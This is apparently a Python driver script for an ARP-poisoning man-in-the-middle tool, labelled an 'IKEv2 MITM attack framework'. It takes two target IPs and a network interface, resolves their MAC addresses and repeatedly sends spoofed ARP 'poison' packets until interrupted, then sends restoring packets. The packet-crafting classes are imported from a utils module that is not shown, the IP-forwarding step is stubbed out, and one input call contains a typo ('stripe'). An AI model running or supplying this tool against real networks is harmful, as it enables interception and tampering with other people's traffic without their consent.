import argparse
import sys
from datetime import datetime
from time import sleep as pause
from utils import PreAttack, Attack


""" Arguments Definition """
parser = argparse.ArgumentParser(description='IKEv2 MITM attack framework')
parser.add_argument('-i', '--interface', help='Network interface to attack on',
                    action='store', dest='interface', default=False)
parser.add_argument('-t1', '--target1', help='First target for poisoning',
                    action='store', dest='target1', default=False)
parser.add_argument('-t2', '--target2', help='Second target for poisoning',
                    action='store', dest='target2', default=False) 
parser.add_argument('-f', '--forward', help='Auto-toggle IP forwarding',
                    action='store_true', dest='forward', default=False)
parser.add_argument('-q', '--quiet', help='Disable feedback messages',
                    action='store_true', dest='quiet', default=False)
parser.add_argument('-c', '--clock', help='Track attack duration',
                    action='store_true', dest='time', default=False)      
args = parser.parse_args()

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)
elif ((not args.target1) or (not args.target2)):
    parser.error('Invalid target')
    sys.exit(1)
elif not args.interface:
    parser.error('No network interface given')
    sys.exit(1)


""" Perform Attack """
start_time = datetime.now()
targets = [args.target1, args.target2]
print('[*] Resolving target address...')
count = 0
sys.stdout.flush()

try:
    MACs = list(map(lambda x: PreAttack(x, args.interface).get_MAC_Addr(), targets))
    print('[DONE]')
except Exception:
    print('[FAIL]\n[!] Failed to resolve target address(es)')
    sys.exit(1)

try:
    if args.forward:
        print("[*] Enabling IP forwarding...")
        # sys.stdout.flush()
        print('[DONE]')
except IOError:
    print('[FAIL]')
    try:
        choice = input('[*] Proceed with attack? [y/n]').stripe().lower()[0]
        if choice == 'y':
            pass
        elif choice == 'n':
            print('[*] User cancelled attack')
            sys.exit(1)
        else:
            print('[!] Invalid choice')
            sys.exit(1)
    except KeyboardInterrupt:
        sys.exit(1)

print('MACs:', MACs)
print('Target ips: {:} and {:}\n'.format(targets[0], targets[1]))
print('Launching attack...\n')

# Excute until external interrupt
while True:
    try:
        try:
            Attack(targets, args.interface).send_Poison(MACs)
        except Exception as e:
            print(e)
            print('[!] Failed to send poison')
            sys.exit(1)
        if not args.quiet:
            count += 1
            print('[*] {:} poison sent to {:} and {:}'.format(count,
                                                              targets[0],
                                                              targets[1]))
        else:
            pass
        pause(2.5)
    except KeyboardInterrupt:
        break

# Clean up
print('\n[*] Stopped ARP poison attack. Restoring network...')
sys.stdout.flush()
for i in range(0, 16):
    try:
        Attack(targets, args.interface).send_Fix(MACs)
    except (Exception, KeyboardInterrupt):
        print('[FAIL]')
        sys.exit(1)
    pause(2)
print('[DONE]')
try:
    if args.forward:
        print('[*] Disabling IP forwarding...')
        sys.stdout.flush()
        # Enable in Linux
        # PreAttack.toggle_IP_Forward().disable_IP_Forward()
        print('[DONE]')
except IOError:
    print('[FAIL]')
if args.time:
    print('[*] Attack Duration: {:}'.format(datetime.now()-start_time))

    